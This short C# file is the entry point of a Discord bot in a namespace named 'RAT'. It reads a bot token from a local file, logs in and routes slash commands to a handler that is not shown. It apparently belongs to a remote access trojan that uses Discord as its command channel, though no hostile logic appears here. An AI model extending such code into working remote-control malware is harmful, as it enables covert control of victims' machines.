using Discord;
using Discord.WebSocket;

namespace RAT;

public class MainRuntime
{
    public static DiscordSocketClient client = new();
    static string tken = File.ReadAllText($"{Environment.CurrentDirectory}/token.tken");
    public static async Task Main(string[] args)
    {
        await client.LoginAsync(TokenType.Bot, tken, true);

        client.Log += async log => await Task.Run(() => Console.WriteLine(log));
        client.SlashCommandExecuted += Handlers.SlashComamndReceived;
        await client.StartAsync();
        await Task.Delay(-1);
    }
}